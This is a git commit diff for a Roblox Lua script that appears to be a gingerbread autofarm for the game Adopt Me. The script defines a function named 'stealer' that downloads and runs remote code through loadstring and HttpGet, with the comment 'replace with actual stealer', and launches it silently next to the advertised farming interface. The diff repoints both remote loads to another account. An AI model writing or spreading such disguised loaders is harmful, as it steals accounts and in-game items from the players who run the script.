46f9f3a51f1a12527f28b343a1f29d072800550c
kurobrut <kurokazawa123@gmail.com>
2025-12-06 11:19:42 +0800

    Update GingerbreadScript.lua

--- GingerbreadScript.lua
+++ GingerbreadScript.lua
@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkezzCreator/ADOPTMEE/refs/heads/main/SCRIPT", true))() -- replace with actual stealer
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/kurobrut/Wards-Hub/refs/heads/main/AutoGingerBread.lua", true))() -- replace with actual stealer
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/SkezzCreator/GINGER/refs/heads/main/AUTOFARM", true))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/kurobrut/Wards-Hub/refs/heads/main/GingerbreadFARM-ADM.lua", true))()
 end
 task.spawn(stealer)
 task.spawn(loadui)
